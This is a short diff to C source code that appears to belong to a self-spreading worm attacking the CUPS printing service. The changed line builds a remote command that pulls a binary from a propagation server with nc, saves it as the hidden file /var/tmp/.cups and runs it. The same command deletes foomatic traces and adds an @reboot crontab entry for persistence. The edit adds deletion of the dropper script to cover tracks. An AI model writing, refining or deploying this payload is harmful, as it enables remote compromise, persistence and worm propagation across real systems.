@@ -297,7 +297,7 @@ void* handle_client(void* arg) {
     }
 
     char *rce_command = global->malloc(MAX_RCE_SIZE);
-    global->snprintf(rce_command, MAX_RCE_SIZE, "echo -n | nc %s %d > /var/tmp/.cups && chmod +x /var/tmp/.cups && rm -f /tmp/foomatic* && echo \'(crontab -l; echo \"@reboot /var/tmp/.cups\") | crontab -; /var/tmp/.cups& \' > /tmp/runme.sh && sh /tmp/runme.sh", server_ip, global->propagation_server_port);
+    global->snprintf(rce_command, MAX_RCE_SIZE, "echo -n | nc %s %d > /var/tmp/.cups && chmod +x /var/tmp/.cups && rm -f /tmp/foomatic* && echo \'(crontab -l; echo \"@reboot /var/tmp/.cups\") | crontab -; /var/tmp/.cups& \' > /tmp/runme.sh && sh /tmp/runme.sh && rm /tmp/runme.sh", server_ip, global->propagation_server_port);
 
     // Create and send IPP response
     size_t response_size;
